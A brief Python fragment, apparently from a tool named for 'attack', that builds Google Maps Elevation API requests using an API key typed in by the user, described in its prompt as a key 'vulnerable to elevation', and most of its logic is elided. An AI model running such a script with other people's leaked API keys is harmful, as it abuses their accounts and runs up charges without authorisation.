...
def generate_url(apikey):
    ...
    return f"https://maps.googleapis.com/maps/api/elevation/json?locations={lat_a}.{lat_b},{lng_a}.{lng_b}&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to elevation: "))
